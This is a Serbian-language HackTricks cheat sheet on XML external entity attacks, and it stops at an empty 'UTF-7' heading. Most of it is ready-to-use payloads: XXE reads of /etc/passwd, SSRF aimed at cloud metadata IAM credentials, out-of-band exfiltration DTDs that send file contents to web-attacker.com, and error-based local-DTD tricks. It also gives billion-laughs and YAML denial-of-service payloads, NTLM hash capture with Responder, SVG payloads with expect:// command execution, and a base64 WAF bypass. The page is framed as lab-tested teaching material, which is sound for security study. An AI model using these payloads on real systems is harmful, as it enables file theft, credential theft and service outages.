# XXE - XEE - Eksterni XML entiteti

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


## Osnove XML-a

XML je jezik za obele쬬vanje dizajniran za skladi코tenje i prenos podataka, koji ima fleksibilnu strukturu koja omogu캖ava kori코캖enje opisno nazvanih oznaka. Razlikuje se od HTML-a po tome 코to nije ograni캜en na skup predefinisanih oznaka. Zna캜aj XML-a je opao sa porastom JSON-a, uprkos njegovoj po캜etnoj ulozi u AJAX tehnologiji.

- **Prikaz podataka putem entiteta**: Entiteti u XML-u omogu캖avaju prikaz podataka, uklju캜uju캖i posebne karaktere poput `&lt;` i `&gt;`, koji odgovaraju `<` i `>` kako bi se izbegao sukob sa XML-ovim sistemom oznaka.

- **Definisanje XML elemenata**: XML omogu캖ava definisanje tipova elemenata, koji opisuju kako bi elementi trebali biti strukturirani i kakav sadr쬬j mogu sadr쬬ti, od bilo kojeg tipa sadr쬬ja do odre캠enih podre캠enih elemenata.

- **Definicija tipa dokumenta (DTD)**: DTD-ovi su klju캜ni u XML-u za definisanje strukture dokumenta i vrsta podataka koje mo쬰 sadr쬬ti. Mogu biti interni, eksterni ili kombinacija oba, i vode na캜in na koji su dokumenti formatirani i validirani.

- **Prilago캠eni i eksterni entiteti**: XML podr쬬va kreiranje prilago캠enih entiteta unutar DTD-a radi fleksibilnog prikaza podataka. Eksterni entiteti, definisani URL-om, izazivaju sigurnosne probleme, posebno u kontekstu napada XML External Entity (XXE), koji iskori코캖avaju na캜in na koji XML parseri obra캠uju eksterne izvore podataka: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`

- **Otkrivanje XXE-a pomo캖u parametarskih entiteta**: Za otkrivanje XXE ranjivosti, posebno kada konvencionalne metode ne uspevaju zbog sigurnosnih mera parsera, mogu se koristiti XML parametarski entiteti. Ovi entiteti omogu캖avaju kori코캖enje tehnika detekcije van opsega, poput pokretanja DNS upita ili HTTP zahteva ka kontrolisanoj domeni, radi potvrde ranjivosti.
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
- `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`


## Glavni napadi

**[Ve캖ina ovih napada je testirana kori코캖enjem sjajnih Portswiggers XEE laboratorija: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Testiranje novog entiteta

U ovom napadu 캖u testirati da li jednostavna deklaracija novog entiteta funkcioni코e.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### 캛itanje fajla

Poku코ajmo da pro캜itamo `/etc/passwd` na razli캜ite na캜ine. Za Windows mo쬰te poku코ati da pro캜itate: `C:\windows\system32\drivers\etc\hosts`

U ovom prvom slu캜aju, primetite da 캖e i "_\*\*file:///\*\*etc/passwd_" za SISTEM raditi.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

Ovaj drugi slu캜aj mo쬰 biti koristan za izvla캜enje fajla ako veb server koristi PHP (Nije slu캜aj sa Portswiggers laboratorijama)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
U ovom tre캖em slu캜aju primetite da deklari코emo `Element stockCheck` kao ANY.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### Lista direktorijuma

U aplikacijama zasnovanim na **Java**-i, mogu캖e je **izlistati sadr쬬j direktorijuma** putem XXE-a sa payloadom kao 코to je prikazano (samo tra쬰nje direktorijuma umesto fajla):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE mo쬰 biti kori코캖en za zloupotrebu SSRF-a unutar oblaka
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Slepa SSRF

Koriste캖i **prethodno komentisanu tehniku**, mo쬰te naterati server da pristupi serveru koji kontroli코ete kako biste pokazali da je ranjiv. Ali, ako to ne funkcioni코e, mo쬯a je zato 코to **XML entiteti nisu dozvoljeni**, u tom slu캜aju mo쬰te poku코ati koristiti **XML parametarske entitete**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Slep" SSRF - Izvla캜enje podataka izvan opsega

**Ovom prilikom 캖emo naterati server da u캜ita novi DTD sa zlonamernim payloadom koji 캖e poslati sadr쬬j fajla putem HTTP zahteva (za vi코elinijske fajlove mo쬰te poku코ati da ih izvu캜ete putem** _**ftp://**_**). Ovo obja코njenje se zasniva na** [**Portswiggers labu ovde**](https://portswigger.net/web-security/xxe/blind)**.**

U datom zlonamernom DTD-u, sprovode se slede캖i koraci za izvla캜enje podataka:

### Primer zlonamernog DTD-a:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Koraci koje izvr코ava ovaj DTD uklju캜uju:

1. **Definicija parametarskih entiteta:**
- Kreira se XML parametarski entitet `%file`, koji 캜ita sadr쬬j datoteke `/etc/hostname`.
- Defini코e se jo코 jedan XML parametarski entitet `%eval`. Dinami캜ki deklari코e novi XML parametarski entitet `%exfiltrate`. Entitet `%exfiltrate` je pode코en da izvr코i HTTP zahtev ka serveru napada캜a, prosle캠uju캖i sadr쬬j entiteta `%file` u upitu URL-a.

2. **Izvr코avanje entiteta:**
- Koristi se entitet `%eval`, 코to dovodi do izvr코avanja dinami캜ke deklaracije entiteta `%exfiltrate`.
- Zatim se koristi entitet `%exfiltrate`, pokre캖u캖i HTTP zahtev ka odre캠enom URL-u sa sadr쬬jem datoteke.

Napada캜 hostuje ovaj zlonamerni DTD na serveru pod njihovom kontrolom, obi캜no na URL-u poput `http://web-attacker.com/malicious.dtd`.

**XXE Payload:**
Da bi iskoristio ranjivu aplikaciju, napada캜 코alje XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ova payload definira XML parametarski entitet `%xxe` i uklju캜uje ga unutar DTD-a. Kada se obradi od strane XML parsera, ova payload dohva캖a eksterni DTD sa servera napada캜a. Parser zatim tuma캜i DTD inline, izvr코ava korake navedene u zlonamjernom DTD-u i dovodi do izvla캜enja datoteke `/etc/hostname` na server napada캜a.


### Gre코ka bazirana na gre코kama (Eksterni DTD)

**U ovom slu캜aju 캖emo naterati server da u캜ita zlonamjerni DTD koji 캖e prikazati sadr쬬j datoteke unutar poruke o gre코ci (ovo je samo va쬰캖e ako mo쬰te videti poruke o gre코ci).** [**Primer odavde.**](https://portswigger.net/web-security/xxe/blind)

Poruka o gre코ci pri parsiranju XML-a, koja otkriva sadr쬬j datoteke `/etc/passwd`, mo쬰 se pokrenuti pomo캖u zlonamernog eksternog Document Type Definition (DTD). To se posti쬰 slede캖im koracima:

1. Defini코e se XML parametarski entitet nazvan `file`, koji sadr쬴 sadr쬬j datoteke `/etc/passwd`.
2. Defini코e se XML parametarski entitet nazvan `eval`, koji uklju캜uje dinami캜ku deklaraciju za drugi XML parametarski entitet nazvan `error`. Ovaj entitet `error`, kada se evaluira, poku코ava da u캜ita nepostoje캖u datoteku, uklju캜uju캖i sadr쬬j entiteta `file` kao njeno ime.
3. Poziva se entitet `eval`, 코to dovodi do dinami캜ke deklaracije entiteta `error`.
4. Pozivanje entiteta `error` rezultira poku코ajem u캜itavanja nepostoje캖e datoteke, 코to proizvodi poruku o gre코ci koja uklju캜uje sadr쬬j datoteke `/etc/passwd` kao deo imena datoteke.

Zlonamerni eksterni DTD mo쬰 se pozvati pomo캖u slede캖eg XML-a:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Prilikom izvr코avanja, odgovor veb servera treba da uklju캜uje poruku o gre코ci koja prikazuje sadr쬬j fajla `/etc/passwd`.


![](<../.gitbook/assets/image (223) (1).png>)

_**Molimo vas da primetite da nam eksterni DTD omogu캖ava da uklju캜imo jednu entitet unutar druge (****`eval`****), ali je to zabranjeno u internom DTD-u. Stoga, ne mo쬰te izazvati gre코ku bez kori코캖enja eksternog DTD-a (obi캜no).**_

### **Gre코ka zasnovana na gre코kama (sistemski DTD)**

맚a je sa ranjivostima slepog XXE-a kada su **blokirane interakcije van opsega** (eksterni konekcije nisu dostupne)?.

Propust u specifikaciji XML jezika mo쬰 **otkriti osetljive podatke putem poruka o gre코kama kada se unutra코nje i spolja코nje deklaracije DTD-a me코aju**. Ovaj problem omogu캖ava internu redefiniciju entiteta koji su spolja코nje deklarisani, olak코avaju캖i izvr코avanje napada zasnovanih na gre코kama XXE-a. Takvi napadi iskori코캖avaju redefiniciju XML parametarskog entiteta, koji je prvobitno deklarisan u eksternom DTD-u, unutar internog DTD-a. Kada su van opsega konekcije blokirane od strane servera, napada캜i se moraju osloniti na lokalne DTD fajlove kako bi izveli napad, sa ciljem izazivanja gre코ke u parsiranju radi otkrivanja osetljivih informacija.


Razmotrite scenarijum u kojem se na serverskom fajl sistemu nalazi DTD fajl na lokaciji `/usr/local/app/schema.dtd`, koji defini코e entitet nazvan `custom_entity`. Napada캜 mo쬰 izazvati gre코ku u parsiranju XML-a koja otkriva sadr쬬j fajla `/etc/passwd` slanjem hibridnog DTD-a na slede캖i na캜in:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Koraci koji su opisani izvr코avaju se putem ovog DTD-a:

- Definicija XML parametarskog entiteta nazvanog `local_dtd` uklju캜uje eksterni DTD fajl koji se nalazi na serverskom fajl sistemu.
- Dolazi do redefinicije XML parametarskog entiteta `custom_entity`, koji je prvobitno definisan u eksternom DTD-u, kako bi se obuhvatio [exploit zasnovan na XXE gre코kama](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Ova redefinicija je dizajnirana da izazove gre코ku pri parsiranju, otkrivaju캖i sadr쬬j fajla `/etc/passwd`.
- Kori코캖enjem entiteta `local_dtd`, eksterni DTD je uklju캜en, obuhvataju캖i novo definisani `custom_entity`. Ova sekvencija radnji dovodi do emitovanja gre코ke koju exploit cilja.

**Primer iz stvarnog sveta:** Sistemi koji koriste GNOME desktop okru쬰nje 캜esto imaju DTD fajl na lokaciji `/usr/share/yelp/dtd/docbookx.dtd` koji sadr쬴 entitet nazvan `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Kako ova tehnika koristi **interno DTD, prvo morate prona캖i validan**. To mo쬰te uraditi **instaliranjem** istog **OS / softvera** koji koristi server i **pretra쬴vanjem nekih podrazumevanih DTD-ova**, ili **preuzimanjem liste** podrazumevanih DTD-ova unutar sistema i **proverom** da li neki od njih postoji:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Za vi코e informacija pogledajte [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Pronala쬰nje DTD-ova unutar sistema

U slede캖em impresivnom github repozitorijumu mo쬰te prona캖i **putanje DTD-ova koje mogu biti prisutne u sistemu**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Osim toga, ako imate **Docker sliku rtvenog sistema**, mo쬰te koristiti alatku iz istog repozitorijuma da **skenirate** **sliku** i **prona캠ete** putanju **DTD-ova** prisutnih unutar sistema. Pro캜itajte [Readme na github-u](https://github.com/GoSecure/dtd-finder) da biste saznali kako.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE putem Office Open XML parsera

Za detaljnije obja코njenje ovog napada, **proverite drugi deo [ovog sjajnog posta](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) sa Detectify-ja**.

Mogu캖nost **u캜itavanja Microsoft Office dokumenata nudi se mnogim veb aplikacijama**, koje zatim izvla캜e odre캠ene detalje iz tih dokumenata. Na primer, veb aplikacija mo쬰 omogu캖iti korisnicima da uvezu podatke u캜itavanjem tabele u XLSX formatu. Da bi parser izvukao podatke iz tabele, neizbe쬹o 캖e morati da analizira barem jedan XML fajl.

Da biste testirali ovu ranjivost, potrebno je kreirati **Microsoft Office fajl koji sadr쬴 XXE payload**. Prvi korak je kreiranje praznog direktorijuma u koji se dokument mo쬰 raspakovati.

Kada se dokument raspakuje, XML fajl koji se nalazi na putanji `./unzipped/word/document.xml` treba otvoriti i urediti u 쬰ljenom tekst editoru (kao 코to je vim). XML treba izmeniti tako da uklju캜uje 쬰ljeni XXE payload, 캜esto po캜ev코i od HTTP zahteva.

Izmenjeni XML redovi trebaju biti umetnuti izme캠u dva korena XML objekta. Va쬹o je zameniti URL sa URL-om koji se mo쬰 pratiti zahtevima.

Na kraju, fajl se mo쬰 zapakovati kako bi se kreirao zlonamerni poc.docx fajl. Iz prethodno kreiranog direktorijuma "unzipped", treba pokrenuti slede캖u komandu:

Sada se kreirani fajl mo쬰 u캜itati na potencijalno ranjivu veb aplikaciju, i mo쬰 se nadati da 캖e se zahtev pojaviti u Burp Collaborator logovima.


### Jar: protokol

Protokol **jar** je dostupan isklju캜ivo unutar **Java aplikacija**. Namenjen je omogu캖avanju pristupa fajlovima unutar **PKZIP** arhive (npr. `.zip`, `.jar`, itd.), podr쬬vaju캖i lokalne i udaljene fajlove.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Da biste mogli pristupiti datotekama unutar PKZIP datoteka, **izuzetno je korisno zloupotrebiti XXE putem sistemskih DTD datoteka**. Pogledajte [ovaj odeljak da biste nau캜ili kako zloupotrebiti sistemsko DTD](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Postupak pristupa datoteci unutar PKZIP arhive putem jar protokola uklju캜uje nekoliko koraka:

1. Napravi se HTTP zahtev za preuzimanje zip arhive sa odre캠ene lokacije, kao 코to je `https://download.website.com/archive.zip`.
2. HTTP odgovor koji sadr쬴 arhivu privremeno se 캜uva na sistemu, obi캜no na lokaciji poput `/tmp/...`.
3. Arhiva se zatim raspakuje kako bi se pristupilo njenom sadr쬬ju.
4. 캛ita se odre캠ena datoteka unutar arhive, `file.zip`.
5. Nakon operacije, sve privremene datoteke koje su stvorene tokom ovog procesa se bri코u.

Interesantna tehnika za prekid ovog procesa u drugom koraku uklju캜uje odr쬬vanje otvorene veze sa serverom neodre캠eno dugo vreme prilikom serviranja arhivne datoteke. Alati dostupni na [ovom repozitorijumu](https://github.com/GoSecure/xxe-workshop/tree/master/24_write_xxe/solution) mogu se koristiti u tu svrhu, uklju캜uju캖i Python server (`slow_http_server.py`) i Java server (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Pisanje datoteka u privremeni direktorijum mo쬰 pomo캖i u **pove캖anju druge ranjivosti koja uklju캜uje putanju pretrage** (kao 코to su lokalno uklju캜ivanje datoteka, ubacivanje 코ablona, XSLT RCE, deserijalizacija itd).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Napad Milijardu Smehova

---

XML eksterni entitet (XXE) napad je sigurnosna ranjivost koja se javlja kada se aplikacija nepravilno obra캠uje XML ulaz. Ova ranjivost omogu캖ava napada캜u da izvr코i razli캜ite vrste napada, uklju캜uju캖i i DoS (Denial of Service) napade.

Jedan od najpoznatijih DoS napada koji se mo쬰 izvesti putem XXE ranjivosti je "Billion Laugh" napad. Ovaj napad koristi XML entitete kako bi generisao ogroman broj ponavljaju캖ih entiteta, 코to dovodi do preoptere캖enja resursa na serveru i onemogu캖ava normalno funkcionisanje aplikacije.

Da bi izveo "Billion Laugh" napad, napada캜 kreira poseban XML dokument koji sadr쬴 definiciju entiteta koja se ponavlja milijardu puta. Kada se ovaj dokument prosledi aplikaciji koja je ranjiva na XXE, server 캖e poku코ati da parsira XML i obradi sve entitete. Me캠utim, zbog velikog broja ponavljanja, server 캖e biti preoptere캖en i mo쬰 do캖i do pada ili usporenog rada aplikacije.

Ovaj napad mo쬰 biti veoma destruktivan, jer mo쬰 dovesti do nedostupnosti aplikacije za legitimne korisnike. Da bi se za코titili od "Billion Laugh" napada, programeri trebaju pravilno obra캠ivati XML ulaz i implementirati odgovaraju캖e sigurnosne mehanizme kako bi spre캜ili XXE ranjivosti.
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Napad

Yaml napad je tehnika koja se koristi za iskori코캖avanje ranjivosti u parsiranju YAML (YAML Ain't Markup Language) datoteka. Ova tehnika omogu캖ava napada캜u da izvr코i udaljeni kod ili izvr코i druge zlonamerne radnje putem YAML datoteke.

Da bi se izveo Yaml napad, napada캜 mora da ubaci zlonamerni YAML kod u aplikaciju koja parsira YAML datoteke. Ova aplikacija mo쬰 biti bilo koja koja podr쬬va YAML format, kao 코to su web aplikacije, alati za konfiguraciju ili sistemi za automatizaciju.

Napada캜 mo쬰 iskoristiti razli캜ite tehnike za izvr코avanje Yaml napada, uklju캜uju캖i:

- **Injection**: Napada캜 mo쬰 ubaciti zlonamerni YAML kod u postoje캖u YAML datoteku ili ga proslediti kao ulaz aplikaciji koja parsira YAML.
- **Entity Expansion**: Napada캜 mo쬰 koristiti tehnike ekspanzije entiteta kako bi izazvao DoS (Denial of Service) napad ili otkrio osetljive informacije.
- **Remote Code Execution**: Napada캜 mo쬰 ubaciti zlonamerni YAML kod koji 캖e se izvr코iti na serveru, omogu캖avaju캖i mu da izvr코ava proizvoljan kod ili izvr코ava druge zlonamerne radnje.

Da bi se za코titili od Yaml napada, preporu캜uje se slede캖e:

- **Validacija unosa**: Aplikacije koje parsiraju YAML datoteke treba da vr코e strogu validaciju unosa kako bi se spre캜ilo ubacivanje zlonamernog koda.
- **Ograni캜enje resursa**: Ograni캜avanje resursa koji se koriste za parsiranje YAML datoteka mo쬰 pomo캖i u spre캜avanju DoS napada.
- **A쬿riranje softvera**: Redovno a쬿riranje softvera koji parsira YAML datoteke mo쬰 pomo캖i u otklanjanju poznatih ranjivosti.

Yaml napad je ozbiljna pretnja za aplikacije koje koriste YAML format. Implementacija odgovaraju캖ih sigurnosnih mera mo쬰 pomo캖i u za코titi od ovog tipa napada.
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Napad kvadratnog naduvavanja

![](<../.gitbook/assets/image (531).png>)

#### Dobijanje NTML-a

Na Windows hostovima je mogu캖e dobiti NTML he코 korisnika veb servera postavljanjem responder.py handlera:
```bash
Responder.py -I eth0 -v
```
i slanjaju캖i slede캖i zahtev
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Onda mo쬰te poku코ati da de코ifrujete he코 koriste캖i hashcat

## Skriveni XXE povr코inski

### XInclude

Kada integri코ete klijentske podatke u serverske XML dokumente, poput onih u pozadinskim SOAP zahtevima, direktna kontrola nad XML strukturom 캜esto je ograni캜ena, 코to ote쬬va tradicionalne XXE napade zbog ograni캜enja u izmeni `DOCTYPE` elementa. Me캠utim, `XInclude` napad pru쬬 re코enje omogu캖avaju캖i umetanje spoljnih entiteta unutar bilo kog elementa podataka XML dokumenta. Ova metoda je efikasna 캜ak i kada se mo쬰 kontrolisati samo deo podataka unutar serverski generisanog XML dokumenta.

Da biste izvr코ili `XInclude` napad, mora se deklarisati `XInclude` namespace, i mora se navesti putanja do 쬰ljenog spoljnog entiteta. U nastavku je sa쬰t primer kako se mo쬰 formulisati takav napad:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Pogledajte [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za vi코e informacija!

### SVG - Slanje datoteka

Datoteke koje korisnici 코alju odre캠enim aplikacijama, a zatim se obra캠uju na serveru, mogu iskoristiti ranjivosti u na캜inu rukovanja XML ili XML-sadr쬬nim formatima datoteka. Uobi캜ajeni formati datoteka poput office dokumenata (DOCX) i slika (SVG) temelje se na XML-u.

Kada korisnici **코alju slike**, te slike se obra캠uju ili provjeravaju na serveru. 캛ak i za aplikacije koje o캜ekuju formate poput PNG ili JPEG, **biblioteka za obradu slika na serveru mo쬰 podr쬬vati i SVG slike**. SVG, kao format temeljen na XML-u, mo쬰 biti iskori코ten od strane napada캜a za slanje zlonamjernih SVG slika, 캜ime se izla쬰 server ranjivostima XXE (XML External Entity).

Primjer takvog napada prikazan je u nastavku, gdje zlonamjerna SVG slika poku코ava 캜itati sistemsku datoteku:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Jo코 jedna metoda uklju캜uje poku코aj **izvr코avanja komandi** putem PHP "expect" omota캜a:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
U oba slu캜aja, SVG format se koristi za pokretanje napada koji iskori코tavaju mogu캖nosti obrade XML-a softvera servera, isti캜u캖i potrebu za sna쬹om validacijom unosa i sigurnosnim merama.

Proverite [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za vi코e informacija!

**Napomena: Prva linija pro캜itanog fajla ili rezultata izvr코enja 캖e se pojaviti UNUTAR kreiranog SVG-a. Dakle, morate biti u mogu캖nosti da pristupite kreiranom SVG-u.**

### **PDF - Slanje fajla**

Pro캜itajte slede캖i post da **saznate kako iskoristiti XXE slanjem PDF** fajla:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Od x-www-urlencoded do XML-a

Ako POST zahtev prihvata podatke u XML formatu, mo쬰te poku코ati da iskoristite XXE u tom zahtevu. Na primer, ako normalan zahtev sadr쬴 slede캖e:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Onda biste mo쬯a mogli poslati slede캖i zahtev, sa istim rezultatom:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Od JSON-a do XEE

Da biste promenili zahtev, mo쬰te koristiti Burp ekstenziju nazvanu "**Content Type Converter**". [Ovde](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) mo쬰te prona캖i ovaj primer:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Jo코 jedan primer mo쬰 se prona캖i [ovde](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypass-ovi za WAF i za코tite

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Ovo radi samo ako XML server prihvata `data://` protokol.

### UTF-7

